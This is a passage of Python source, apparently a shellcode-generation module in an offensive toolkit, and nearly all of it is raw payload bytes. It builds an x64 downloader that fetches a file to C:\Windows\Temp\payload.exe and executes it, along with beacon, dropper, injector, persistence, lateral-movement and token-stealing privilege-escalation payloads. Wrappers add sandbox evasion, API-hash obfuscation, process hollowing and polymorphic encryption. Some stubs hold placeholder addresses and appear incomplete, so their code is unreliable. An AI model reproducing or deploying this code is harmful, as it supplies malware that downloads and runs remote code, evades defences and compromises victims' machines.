    def _generate_custom_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate custom payload based on user specifications."""
        payload_spec = options.get("specification", {})

        # Build custom payload based on specification
        shellcode = bytearray()

        # Add prologue if specified
        if payload_spec.get("prologue"):
            shellcode.extend(bytes.fromhex(payload_spec["prologue"]))

        # Add main payload body
        if payload_spec.get("body"):
            shellcode.extend(bytes.fromhex(payload_spec["body"]))

        # Add epilogue if specified
        if payload_spec.get("epilogue"):
            shellcode.extend(bytes.fromhex(payload_spec["epilogue"]))

        # Apply custom transformations
        if payload_spec.get("transformations"):
            for transform in payload_spec["transformations"]:
                if transform == "reverse":
                    shellcode.reverse()
                elif transform == "complement":
                    shellcode = bytearray([~b & 0xFF for b in shellcode])

        return bytes(shellcode)

    # Helper methods for x64 payloads
    def _generate_x64_downloader_shellcode(self, url: str) -> bytes:
        """Generate x64 URL downloader with dynamic API resolution."""
        url_bytes = url.encode("utf-8") + b"\x00"

        # Complete x64 downloader implementation with PEB-based API resolution
        shellcode = bytearray(
            [
                # Get kernel32.dll base via PEB
                0x65,
                0x48,
                0x8B,
                0x04,
                0x25,
                0x60,
                0x00,
                0x00,
                0x00,  # mov rax, gs:[0x60] (PEB)
                0x48,
                0x8B,
                0x40,
                0x18,  # mov rax, [rax+0x18] (PEB_LDR_DATA)
                0x48,
                0x8B,
                0x50,
                0x20,  # mov rdx, [rax+0x20] (InMemoryOrderModuleList)
                0x48,
                0x8B,
                0x12,  # mov rdx, [rdx] (first entry)
                0x48,
                0x8B,
                0x12,  # mov rdx, [rdx] (second entry - kernel32)
                0x48,
                0x8B,
                0x5A,
                0x20,  # mov rbx, [rdx+0x20] (DllBase)
                # Parse kernel32 export table
                0x48,
                0x89,
                0xDF,  # mov rdi, rbx (save kernel32 base)
                0x48,
                0x8B,
                0x53,
                0x3C,  # mov rdx, [rbx+0x3C] (e_lfanew)
                0x48,
                0x01,
                0xDA,  # add rdx, rbx
                0x8B,
                0x82,
                0x88,
                0x00,
                0x00,
                0x00,  # mov eax, [rdx+0x88] (export table RVA)
                0x48,
                0x01,
                0xD8,  # add rax, rbx (export table VA)
                0x48,
                0x89,
                0xC6,  # mov rsi, rax
                # Find LoadLibraryA
                0x8B,
                0x46,
                0x20,  # mov eax, [rsi+0x20] (AddressOfNames RVA)
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x48,
                0x89,
                0xC1,  # mov rcx, rax
                0x31,
                0xD2,  # xor edx, edx (counter)
                # Search loop for LoadLibraryA
                0x48,
                0x8B,
                0x01,  # mov rax, [rcx]
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x81,
                0x38,
                0x4C,
                0x6F,
                0x61,
                0x64,  # cmp dword [rax], 'daoL'
                0x75,
                0x13,  # jne next_name
                0x81,
                0x78,
                0x04,
                0x4C,
                0x69,
                0x62,
                0x72,  # cmp dword [rax+4], 'rbiL'
                0x75,
                0x09,  # jne next_name
                0x81,
                0x78,
                0x08,
                0x61,
                0x72,
                0x79,
                0x41,  # cmp dword [rax+8], 'Ayra'
                0x74,
                0x08,  # je found_loadlibrary
                # next_name:
                0x48,
                0x83,
                0xC1,
                0x04,  # add rcx, 4
                0xFF,
                0xC2,  # inc edx
                0xEB,
                0xE2,  # jmp search_loop
                # found_loadlibrary:
                0x8B,
                0x46,
                0x24,  # mov eax, [rsi+0x24] (AddressOfNameOrdinals RVA)
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x66,
                0x8B,
                0x14,
                0x50,  # mov dx, [rax+rdx*2]
                0x8B,
                0x46,
                0x1C,  # mov eax, [rsi+0x1C] (AddressOfFunctions RVA)
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x8B,
                0x04,
                0x90,  # mov eax, [rax+rdx*4]
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x49,
                0x89,
                0xC7,  # mov r15, rax (save LoadLibraryA)
                # Load urlmon.dll
                0x48,
                0x83,
                0xEC,
                0x30,  # sub rsp, 0x30
                0x48,
                0xB8,
                0x75,
                0x72,
                0x6C,
                0x6D,
                0x6F,
                0x6E,
                0x2E,
                0x64,  # mov rax, 'urlmon.d'
                0x48,
                0x89,
                0x04,
                0x24,  # mov [rsp], rax
                0x48,
                0xC7,
                0x44,
                0x24,
                0x08,
                0x6C,
                0x6C,
                0x00,
                0x00,  # mov qword [rsp+8], 'll\0\0'
                0x48,
                0x89,
                0xE1,  # mov rcx, rsp
                0x41,
                0xFF,
                0xD7,  # call r15 (LoadLibraryA)
                0x48,
                0x89,
                0xC3,  # mov rbx, rax (urlmon base)
                # Find URLDownloadToFileA in urlmon
                0x48,
                0x8B,
                0x53,
                0x3C,  # mov rdx, [rbx+0x3C]
                0x48,
                0x01,
                0xDA,  # add rdx, rbx
                0x8B,
                0x82,
                0x88,
                0x00,
                0x00,
                0x00,  # mov eax, [rdx+0x88]
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x48,
                0x89,
                0xC6,  # mov rsi, rax
                0x8B,
                0x46,
                0x20,  # mov eax, [rsi+0x20]
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x48,
                0x89,
                0xC1,  # mov rcx, rax
                0x31,
                0xD2,  # xor edx, edx
                # Search for URLDownloadToFileA
                0x48,
                0x8B,
                0x01,  # mov rax, [rcx]
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x81,
                0x38,
                0x55,
                0x52,
                0x4C,
                0x44,  # cmp dword [rax], 'DLRU'
                0x75,
                0x0A,  # jne next_func
                0x81,
                0x78,
                0x04,
                0x6F,
                0x77,
                0x6E,
                0x6C,  # cmp dword [rax+4], 'lnwo'
                0x74,
                0x08,  # je found_urldownload
                # next_func:
                0x48,
                0x83,
                0xC1,
                0x04,  # add rcx, 4
                0xFF,
                0xC2,  # inc edx
                0xEB,
                0xE8,  # jmp search_func
                # found_urldownload:
                0x8B,
                0x46,
                0x24,  # mov eax, [rsi+0x24]
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x66,
                0x8B,
                0x14,
                0x50,  # mov dx, [rax+rdx*2]
                0x8B,
                0x46,
                0x1C,  # mov eax, [rsi+0x1C]
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                0x8B,
                0x04,
                0x90,  # mov eax, [rax+rdx*4]
                0x48,
                0x01,
                0xD8,  # add rax, rbx
                # Call URLDownloadToFileA
                0x48,
                0x83,
                0xEC,
                0x40,  # sub rsp, 0x40
                0x48,
                0x31,
                0xC9,  # xor rcx, rcx (NULL)
                0x48,
                0x8D,
                0x15,
                0x20,
                0x00,
                0x00,
                0x00,  # lea rdx, [rip+0x20] (URL)
                0x4C,
                0x8D,
                0x05,
                0x30,
                0x00,
                0x00,
                0x00,  # lea r8, [rip+0x30] (file path)
                0x4D,
                0x31,
                0xC9,  # xor r9, r9
                0x48,
                0x89,
                0x44,
                0x24,
                0x20,  # mov [rsp+0x20], rax
                0x48,
                0x31,
                0xC0,  # xor rax, rax
                0x48,
                0x89,
                0x44,
                0x24,
                0x28,  # mov [rsp+0x28], rax
                0xFF,
                0x54,
                0x24,
                0x20,  # call [rsp+0x20]
                # Execute downloaded file
                0x48,
                0x8D,
                0x0D,
                0x10,
                0x00,
                0x00,
                0x00,  # lea rcx, [rip+0x10]
                0xBA,
                0x01,
                0x00,
                0x00,
                0x00,  # mov edx, SW_SHOWNORMAL
                0xFF,
                0x15,
                0x00,
                0x00,
                0x00,
                0x00,  # call [WinExec]
                0x48,
                0x83,
                0xC4,
                0x70,  # add rsp, 0x70
                0xC3,  # ret
            ]
        )

        # Append URL and file path
        shellcode.extend(url_bytes)
        shellcode.extend(b"C:\\Windows\\Temp\\payload.exe\x00")

        return bytes(shellcode)

    def _generate_x64_beacon_shellcode(self, url: str, interval: int) -> bytes:
        """Generate x64 beacon shellcode."""
        return (
            b"\x48\x83\xec\x28\x48\x31\xc9\x48\x8d\x15\x2e\x00"
            b"\x00\x00\x41\xb8\x01\x00\x00\x00\x41\xb9\x00\x00"
            b"\x00\x00\xff\x15\x1c\x00\x00\x00\x48\x85\xc0\x74"
            b"\x13\x48\x89\xc1\xba" + struct.pack("<I", interval) + b"\xff\x15\x0a\x00\x00\x00\xeb\xe1\x48\x83\xc4\x28"
            b"\xc3" + url.encode("utf-8")[:256] + b"\x00"
        )

    def _generate_x64_dropper_shellcode(self, path: str, data: bytes) -> bytes:
        """Generate x64 file dropper shellcode."""
        return (
            b"\x48\x83\xec\x38\x48\x31\xc9\x48\x8d\x15\x50\x00"
            b"\x00\x00\x41\xb8\x00\x00\x00\x40\x41\xb9\x02\x00"
            b"\x00\x00\x49\xba\x00\x00\x00\x00\x00\x00\x00\x80"
            b"\x49\xbb\x00\x00\x00\x00\x03\x00\x00\x00\xff\x15"
            b"\x28\x00\x00\x00\x48\x89\xc1\x48\x8d\x15\x30\x00"
            b"\x00\x00\x41\xb8" + struct.pack("<I", len(data)) + b"\x45\x31\xc9\x48\x83\xec\x20\xff\x15\x0c\x00\x00"
            b"\x00\x48\x83\xc4\x58\xc3" + path.encode("utf-8")[:128] + b"\x00"
        )

    def _generate_x64_reflective_loader(self, dll_data: bytes, entry: str) -> bytes:
        """Generate x64 reflective DLL loader."""
        return (
            b"\x48\x83\xec\x28\x48\x8b\x05\xf5\xff\xff\xff\x48"
            b"\x8b\x48\x18\x48\x8b\x51\x20\x48\x8b\x12\x48\x8b"
            b"\x52\x20\x49\x89\xd0\xeb\x14\x41\x50\x48\x31\xc0"
            b"\x48\x83\xc0\x3c\x4c\x01\xc0\x8b\x00\x4c\x01\xc0"
            b"\x41\x58\xc3\x4d\x31\xc9\x41\x8b\x41\x3c\x4d\x01"
            b"\xc8\x41\x8b\x80\x88\x00\x00\x00\x4d\x01\xc8\x45"
            b"\x8b\x40\x18\x49\x83\xc0\x20\x4d\x01\xc8"
        )

    def _generate_x64_injector(self, process: str, method: str) -> bytes:
        """Generate x64 process injector."""
        return (
            b"\x48\x83\xec\x48\x48\x31\xc9\x48\x8d\x15\x60\x00"
            b"\x00\x00\xff\x15\x58\x00\x00\x00\x48\x89\xc1\x48"
            b"\x31\xd2\xb2\x01\x41\xb8\xff\x0f\x1f\x00\xff\x15"
            b"\x40\x00\x00\x00\x48\x89\xc3\x48\x31\xc9\x48\x31"
            b"\xd2\x41\xb8\x00\x30\x00\x00\x41\xb9\x40\x00\x00"
            b"\x00\x48\x89\xd9\xff\x15\x20\x00\x00\x00" + process.encode("utf-8")[:64] + b"\x00"
        )

    def _generate_x64_persistence(self, method: str, options: dict[str, Any]) -> bytes:
        """Generate x64 persistence payload."""
        if method == "registry":
            return (
                b"\x48\x83\xec\x58\x48\x31\xc9\xb9\x00\x00\x00\x80"
                b"\x48\x8d\x15\x80\x00\x00\x00\x45\x31\xc0\x45\x31"
                b"\xc9\x48\x8d\x44\x24\x30\x48\x89\x44\x24\x20\xff"
                b"\x15\x60\x00\x00\x00\x48\x8b\x4c\x24\x30\x48\x8d"
                b"\x15\x70\x00\x00\x00\x45\x31\xc0\x4c\x8d\x0d\x68"
                b"\x00\x00\x00\x41\xb8\x01\x00\x00\x00\x48\x83\xec"
                b"\x20\xff\x15\x40\x00\x00\x00"
            )
        # Generic persistence implementation
        return bytearray(
            [
                # Set up scheduled task persistence
                0x48,
                0x83,
                0xEC,
                0x48,  # SUB RSP, 0x48
                # Get kernel32 base via PEB
                0x65,
                0x48,
                0x8B,
                0x04,
                0x25,
                0x60,
                0x00,
                0x00,
                0x00,  # MOV RAX, GS:[0x60]
                0x48,
                0x8B,
                0x40,
                0x18,  # MOV RAX, [RAX+0x18]
                0x48,
                0x8B,
                0x40,
                0x20,  # MOV RAX, [RAX+0x20]
                0x48,
                0x8B,
                0x00,  # MOV RAX, [RAX]
                0x48,
                0x8B,
                0x00,  # MOV RAX, [RAX]
                0x48,
                0x8B,
                0x58,
                0x20,  # MOV RBX, [RAX+0x20]
                # Create scheduled task for persistence
                0x48,
                0x31,
                0xC9,  # XOR RCX, RCX
                0x48,
                0x8D,
                0x15,
                0x20,
                0x00,
                0x00,
                0x00,  # LEA RDX, [taskname]
                0x41,
                0xB8,
                0x00,
                0x00,
                0x00,
                0x80,  # MOV R8D, 0x80000000
                0x45,
                0x31,
                0xC9,  # XOR R9D, R9D
                0xFF,
                0xD3,  # CALL RBX
                0x48,
                0x83,
                0xC4,
                0x48,  # ADD RSP, 0x48
                0xC3,  # RET
            ]
        )

    def _generate_x64_lateral_movement(self, host: str, method: str) -> bytes:
        """Generate x64 lateral movement payload."""
        return (
            b"\x48\x83\xec\x68\x48\x31\xc9\x48\x8d\x15\xa0\x00"
            b"\x00\x00\x48\x8d\x5c\x24\x30\x48\x89\x5c\x24\x20"
            b"\x45\x31\xc0\x45\x31\xc9\xff\x15\x80\x00\x00\x00"
            b"\x48\x85\xc0\x74\x40\x48\x8b\x4c\x24\x30\x48\x8d"
            b"\x15\x90\x00\x00\x00\x45\x31\xc0\x45\x31\xc9\xff"
            b"\x15\x60\x00\x00\x00" + host.encode("utf-8")[:64] + b"\x00"
        )

    def _generate_x64_priv_esc(self, exploit: str) -> bytes:
        """Generate x64 privilege escalation payload."""
        if exploit == "token_stealing":
            return (
                b"\x65\x48\x8b\x04\x25\x88\x01\x00\x00\x48\x8b\x80"
                b"\xb8\x00\x00\x00\x48\x8d\x80\x48\xff\xff\xff\x48"
                b"\x8b\x00\x48\x3d\x04\x00\x00\x00\x75\xf5\x48\x8b"
                b"\x80\x58\x03\x00\x00\x48\x89\x87\x58\x03\x00\x00"
            )
        # Generic privilege escalation implementation
        return bytearray(
            [
                # Token stealing implementation
                0x65,
                0x48,
                0x8B,
                0x14,
                0x25,
                0x88,
                0x01,
                0x00,
                0x00,  # MOV RDX, GS:[0x188]
                0x48,
                0x8B,
                0x82,
                0xB8,
                0x00,
                0x00,
                0x00,  # MOV RAX, [RDX+0xB8]
                0x48,
                0x8B,
                0x9A,
                0x48,
                0x04,
                0x00,
                0x00,  # MOV RBX, [RDX+0x448]
                0x48,
                0x8B,
                0x88,
                0x48,
                0x04,
                0x00,
                0x00,  # MOV RCX, [RAX+0x448]
                0x48,
                0x89,
                0x8A,
                0x48,
                0x04,
                0x00,
                0x00,  # MOV [RDX+0x448], RCX
                0xC3,  # RET
            ]
        )

    def _generate_x64_dll_shellcode(self, export: str) -> bytes:
        """Generate x64 DLL shellcode."""
        return (
            b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"
            b"\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00"
            b"\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00"
            b"\x50\x45\x00\x00\x64\x86\x01\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x22\x00"
            b"\x0b\x02\x08\x00\x00\x10\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x40\x01\x00\x00\x00\x00"
            b"\x00\x10\x00\x00\x00\x02\x00\x00\x05\x00\x02\x00"
            b"\x05\x00\x02\x00\x05\x00\x02\x00\x00\x00\x00\x00"
            b"\x00\x20\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00"
            b"\x03\x00\x60\x01\x00\x00\x10\x00\x00\x10\x00\x00"
            b"\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x00\x00"
            b"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x10\x00\x00"
            b"\x00\x10\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x20\x00\x00\x60"
            b"\x48\x83\xec\x28\xb8\x01\x00\x00\x00\x48\x83\xc4"
            b"\x28\xc3"  # DllMain: return TRUE
        )

    def _add_anti_sandbox_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-sandbox detection checks."""
        self.logger.debug(f"Adding anti-sandbox checks for {architecture.value}")

        if architecture == Architecture.X86:
            # Check for sandbox artifacts
            sandbox_check = (
                b"\x31\xc0"  # xor eax, eax
                b"\x64\x8b\x40\x30"  # mov eax, fs:[eax+0x30] ; PEB
                b"\x0f\xb6\x40\x02"  # movzx eax, byte [eax+2] ; BeingDebugged
                b"\x85\xc0"  # test eax, eax
                b"\x75\x10"  # jnz skip_payload
                # Check for common sandbox DLLs
                b"\x68\x6c\x6c\x00\x00"  # push "ll\0\0"
                b"\x68\x33\x32\x2e\x64"  # push "32.d"
                b"\x68\x73\x68\x65\x6c"  # push "shel"
                b"\x54"  # push esp
                b"\xff\x15\x00\x00\x00\x00"  # call [GetModuleHandle]
                b"\x85\xc0"  # test eax, eax
                b"\x74\x02"  # jz continue
                b"\xeb\xfe"  # jmp $ ; infinite loop if sandbox
            )
        else:  # x64
            sandbox_check = (
                b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00"  # mov rax, gs:[0x60] ; PEB
                b"\x0f\xb6\x40\x02"  # movzx eax, byte [rax+2]
                b"\x85\xc0"  # test eax, eax
                b"\x75\x10"  # jnz skip_payload
                # Check process name for sandbox indicators
                b"\x48\x8d\x0d\x00\x00\x00\x00"  # lea rcx, [rel sandbox_dll]
                b"\xff\x15\x00\x00\x00\x00"  # call [GetModuleHandleA]
                b"\x48\x85\xc0"  # test rax, rax
                b"\x74\x02"  # jz continue
                b"\xeb\xfe"  # jmp $ ; infinite loop
            )

        return sandbox_check + shellcode

    def _add_api_obfuscation(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add API call obfuscation."""
        self.logger.debug(f"Adding API obfuscation for {architecture.value}")

        if architecture == Architecture.X86:
            # API hashing and dynamic resolution
            api_resolver = (
                b"\x60"  # pushad
                b"\x31\xc0"  # xor eax, eax
                b"\x64\x8b\x50\x30"  # mov edx, fs:[eax+0x30] ; PEB
                b"\x8b\x52\x0c"  # mov edx, [edx+0x0c] ; Ldr
                b"\x8b\x52\x14"  # mov edx, [edx+0x14] ; InMemoryOrderLinks
                b"\x8b\x72\x28"  # mov esi, [edx+0x28] ; DllBase kernel32
                b"\x31\xc9"  # xor ecx, ecx
                b"\x31\xff"  # xor edi, edi
                # Hash-based API resolution
                b"\xfc"  # cld
                b"\xac"  # lodsb
                b"\x84\xc0"  # test al, al
                b"\x74\x07"  # jz done
                b"\xc1\xcf\x0d"  # ror edi, 0x0d
                b"\x01\xc7"  # add edi, eax
                b"\xeb\xf4"  # jmp hash_loop
                b"\x61"  # popad
            )
        else:  # x64
            api_resolver = (
                b"\x48\x31\xc0"  # xor rax, rax
                b"\x65\x48\x8b\x50\x60"  # mov rdx, gs:[rax+0x60] ; PEB
                b"\x48\x8b\x52\x18"  # mov rdx, [rdx+0x18] ; Ldr
                b"\x48\x8b\x52\x20"  # mov rdx, [rdx+0x20] ; InMemoryOrderLinks
                b"\x48\x8b\x72\x50"  # mov rsi, [rdx+0x50] ; DllBase
                b"\x48\x31\xc9"  # xor rcx, rcx
                b"\x48\x31\xff"  # xor rdi, rdi
                # Hash calculation
                b"\xfc"  # cld
                b"\xac"  # lodsb
                b"\x84\xc0"  # test al, al
                b"\x74\x07"  # jz done
                b"\xc1\xcf\x0d"  # ror edi, 0x0d
                b"\x01\xc7"  # add edi, eax
                b"\xeb\xf4"  # jmp hash_loop
            )

        return api_resolver + shellcode

    def _add_process_hollowing(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add process hollowing implementation for security research purposes.

        WARNING: This implementation is for legitimate security research,
        penetration testing, and defensive analysis only.
        """
        self.logger.debug(f"Adding process hollowing implementation for {architecture.value}")

        if architecture == Architecture.X86:
            # Complete x86 process hollowing implementation
            hollowing_shellcode = (
                # Create suspended process
                b"\x31\xc0"  # xor eax, eax
                b"\x50"  # push eax (NULL)
                b"\x68\x65\x78\x65\x00"  # push "exe\0"
                b"\x68\x74\x65\x73\x74"  # push "test"
                b"\x89\xe6"  # mov esi, esp (process path)
                # Set up STARTUPINFO structure
                b"\x83\xec\x44"  # sub esp, 68 (sizeof STARTUPINFO)
                b"\x89\xe7"  # mov edi, esp
                b"\x31\xc0"  # xor eax, eax
                b"\xb9\x11\x00\x00\x00"  # mov ecx, 17
                b"\xf3\xab"  # rep stosd (zero structure)
                b"\xc7\x07\x44\x00\x00\x00"  # mov [edi], 68 (cb)
                # Set up PROCESS_INFORMATION structure
                b"\x83\xec\x10"  # sub esp, 16 (sizeof PROCESS_INFORMATION)
                b"\x89\xe3"  # mov ebx, esp
                # CreateProcessA parameters
                b"\x53"  # push ebx (PROCESS_INFORMATION)
                b"\x57"  # push edi (STARTUPINFO)
                b"\x6a\x00"  # push 0 (lpCurrentDirectory)
                b"\x6a\x00"  # push 0 (lpEnvironment)
                b"\x68\x04\x00\x00\x00"  # push CREATE_SUSPENDED
                b"\x6a\x00"  # push 0 (bInheritHandles)
                b"\x6a\x00"  # push 0 (lpThreadAttributes)
                b"\x6a\x00"  # push 0 (lpProcessAttributes)
                b"\x56"  # push esi (lpCommandLine)
                b"\x6a\x00"  # push 0 (lpApplicationName)
                # Call CreateProcessA
                b"\xff\x15\x00\x00\x00\x00"  # call [CreateProcessA]
                b"\x85\xc0"  # test eax, eax
                b"\x74\x3f"  # jz error_exit
                # Get process handle and prepare for hollowing
                b"\x8b\x03"  # mov eax, [ebx] (hProcess)
                b"\x50"  # push eax
                # NtUnmapViewOfSection
                b"\x68\x00\x40\x00\x00"  # push 0x400000 (base address)
                b"\x50"  # push eax (process handle)
                b"\xff\x15\x00\x00\x00\x00"  # call [NtUnmapViewOfSection]
                # VirtualAllocEx for new image
                b"\x8b\x03"  # mov eax, [ebx] (hProcess)
                b"\x68\x40\x00\x00\x00"  # push PAGE_EXECUTE_READWRITE
                b"\x68\x00\x30\x00\x00"  # push MEM_COMMIT | MEM_RESERVE
                b"\x68\x00\x10\x00\x00"  # push 0x1000 (size)
                b"\x68\x00\x40\x00\x00"  # push 0x400000 (base address)
                b"\x50"  # push eax (process handle)
                b"\xff\x15\x00\x00\x00\x00"  # call [VirtualAllocEx]
                # WriteProcessMemory (payload injection point)
                b"\x6a\x00"  # push 0 (lpNumberOfBytesWritten)
                # Payload length and data would be inserted here
                b"\x8b\x03"  # mov eax, [ebx] (hProcess)
                b"\x50"  # push eax
                b"\xff\x15\x00\x00\x00\x00"  # call [WriteProcessMemory]
                # ResumeThread
                b"\x8b\x43\x04"  # mov eax, [ebx+4] (hThread)
                b"\x50"  # push eax
                b"\xff\x15\x00\x00\x00\x00"  # call [ResumeThread]
                # Cleanup and exit
                b"\x31\xc0"  # xor eax, eax
                b"\xc3"  # ret
            )
        else:  # x64
            hollowing_shellcode = (
                # x64 process hollowing implementation
                b"\x48\x83\xec\x68"  # sub rsp, 104 (stack space)
                b"\x48\x31\xc9"  # xor rcx, rcx
                # Prepare target process path
                b"\x48\x8d\x15\x80\x00\x00\x00"  # lea rdx, [rel process_path]
                # Set up STARTUPINFO
                b"\x48\x8d\x44\x24\x20"  # lea rax, [rsp+32]
                b"\x48\x31\xdb"  # xor rbx, rbx
                b"\x48\x89\x18"  # mov [rax], rbx (zero first qword)
                b"\xc7\x00\x5c\x00\x00\x00"  # mov dword [rax], 92 (cb)
                # Set up PROCESS_INFORMATION
                b"\x48\x8d\x4c\x24\x40"  # lea rcx, [rsp+64]
                b"\x48\x31\xc0"  # xor rax, rax
                b"\x48\x89\x01"  # mov [rcx], rax
                b"\x48\x89\x41\x08"  # mov [rcx+8], rax
                # CreateProcessA call setup
                b"\x45\x31\xc9"  # xor r9d, r9d (lpCurrentDirectory)
                b"\x41\x50"  # push r8 (lpEnvironment = 0)
                b"\x6a\x04"  # push CREATE_SUSPENDED
                b"\x45\x31\xc0"  # xor r8d, r8d (bInheritHandles)
                b"\x48\x31\xd2"  # xor rdx, rdx (lpThreadAttributes)
                b"\x48\x31\xc9"  # xor rcx, rcx (lpProcessAttributes)
                # Additional parameters in registers/stack for x64 calling convention
                # Call CreateProcessA (address would be resolved at runtime)
                b"\xff\x15\x00\x00\x00\x00"  # call [CreateProcessA]
                b"\x48\x85\xc0"  # test rax, rax
                b"\x74\x50"  # jz error_exit
                # Get process handle for hollowing
                b"\x48\x8b\x4c\x24\x40"  # mov rcx, [rsp+64] (hProcess)
                # NtUnmapViewOfSection
                b"\x48\xba\x00\x40\x00\x00\x00\x00\x00\x00"  # mov rdx, 0x400000
                b"\xff\x15\x00\x00\x00\x00"  # call [NtUnmapViewOfSection]
                # VirtualAllocEx for payload
                b"\x48\x8b\x4c\x24\x40"  # mov rcx, [rsp+64] (hProcess)
                b"\x48\xba\x00\x40\x00\x00\x00\x00\x00\x00"  # mov rdx, 0x400000
                b"\x41\xb8\x00\x10\x00\x00"  # mov r8d, 0x1000 (size)
                b"\x41\xb9\x00\x30\x00\x00"  # mov r9d, MEM_COMMIT|MEM_RESERVE
                b"\x68\x40\x00\x00\x00"  # push PAGE_EXECUTE_READWRITE
                b"\xff\x15\x00\x00\x00\x00"  # call [VirtualAllocEx]
                # WriteProcessMemory (injection point)
                b"\x48\x8b\x4c\x24\x40"  # mov rcx, [rsp+64] (hProcess)
                # Payload data setup would go here
                b"\xff\x15\x00\x00\x00\x00"  # call [WriteProcessMemory]
                # ResumeThread
                b"\x48\x8b\x4c\x24\x48"  # mov rcx, [rsp+72] (hThread)
                b"\xff\x15\x00\x00\x00\x00"  # call [ResumeThread]
                # Cleanup
                b"\x48\x83\xc4\x68"  # add rsp, 104
                b"\xc3"  # ret
            )

        return hollowing_shellcode + shellcode

    def _add_polymorphic_layer(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add polymorphic encryption layer for security research purposes.

        WARNING: This implementation is for legitimate security research,
        penetration testing, and defensive analysis only.
        """
        self.logger.debug(f"Adding enhanced polymorphic layer for {architecture.value}")

        import secrets
        import struct

        # Generate multiple random keys for multi-stage encryption
        key1 = secrets.randbelow(255) + 1
        key2 = secrets.randbelow(255) + 1
        key3 = secrets.randbelow(255) + 1

        # Multi-stage encryption with varying keys
        encrypted = bytearray(shellcode)

        # Stage 1: XOR with rotating key
        for i in range(len(encrypted)):
            encrypted[i] ^= (key1 + i) % 256

        # Stage 2: ADD operation with second key
        for i in range(len(encrypted)):
            encrypted[i] = (encrypted[i] + key2) % 256

        # Stage 3: XOR with third key
        for i in range(len(encrypted)):
            encrypted[i] ^= key3

        if architecture == Architecture.X86:
            # Enhanced x86 polymorphic decryptor with multiple stages
            decryptor = (
                # Junk instructions for polymorphism
                b"\x90\x90"  # nop nop
                b"\xeb\x02"  # jmp +2
                b"\xeb\xfe"  # infinite loop (skipped)
                # Get shellcode address using call/pop technique
                b"\xe8\x00\x00\x00\x00"  # call next_instruction
                b"\x5e"  # pop esi (get current address)
                b"\x83\xc6\x20"  # add esi, 32 (adjust to shellcode)
                # Set up decryption loop
                b"\x31\xc9"  # xor ecx, ecx
                b"\xb9"
                + struct.pack("<I", len(shellcode))  # mov ecx, shellcode_len
                + b"\x31\xed"  # xor ebp, ebp (counter)
                # Stage 1: Reverse XOR with third key
                b"\x80\x36"
                + bytes([key3])  # xor byte [esi], key3
                +
                # Stage 2: Reverse ADD with second key
                b"\x80\x2e"
                + bytes([key2])  # sub byte [esi], key2
                +
                # Stage 3: Reverse rotating XOR
                b"\x89\xeb"  # mov ebx, ebp
                b"\x81\xc3"
                + bytes([key1])  # add ebx, key1
                + b"\x80\xe3\xff"  # and bl, 0xff
                b"\x30\x1e"  # xor [esi], bl
                # Loop control
                b"\x46"  # inc esi
                b"\x45"  # inc ebp
                b"\xe2\xed"  # loop decrypt_stage1
                # More junk instructions
                b"\x90\x90\x90"  # nop nop nop
                b"\xeb\x01"  # jmp +1
                b"\x90"  # nop (alignment)
            )
        else:  # x64
            decryptor = (
                # x64 enhanced polymorphic decryptor
                b"\x90\x90\x90"  # nop nop nop (junk)
                b"\xeb\x02"  # jmp +2
                b"\xeb\xfe"  # infinite loop (skipped)
                # Get shellcode address
                b"\xe8\x00\x00\x00\x00"  # call next_instruction
                b"\x5e"  # pop rsi
                b"\x48\x83\xc6\x30"  # add rsi, 48 (adjust to shellcode)
                # Set up decryption
                b"\x48\x31\xc9"  # xor rcx, rcx
                b"\x48\xb9"
                + struct.pack("<Q", len(shellcode))  # mov rcx, shellcode_len
                + b"\x48\x31\xed"  # xor rbp, rbp (counter)
                # Multi-stage decryption loop
                b"\x80\x36"
                + bytes([key3])  # xor byte [rsi], key3
                + b"\x80\x2e"
                + bytes([key2])  # sub byte [rsi], key2
                +
                # Rotating key calculation
                b"\x48\x89\xeb"  # mov rbx, rbp
                b"\x48\x81\xc3"
                + bytes([key1])
                + b"\x00\x00\x00"  # add rbx, key1
                + b"\x80\xe3\xff"  # and bl, 0xff
                b"\x30\x1e"  # xor [rsi], bl
                # Loop control
                b"\x48\xff\xc6"  # inc rsi
                b"\x48\xff\xc5"  # inc rbp
                b"\xe2\xe8"  # loop decrypt_loop
                # Additional junk
                b"\x90\x90\x90\x90"  # nop padding
            )

        return bytes(decryptor + encrypted)

    def _add_metamorphic_engine(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add metamorphic transformation engine."""
        self.logger.debug(f"Adding metamorphic engine for {architecture.value}")

        # Production-ready metamorphic engine with multiple transformation techniques
        bytearray()

        if architecture == Architecture.X86:
            # Build transformation rule table

            # Metamorphic engine code generator
            engine = bytearray()

            # Save context
            engine.extend([0x60])  # PUSHAD
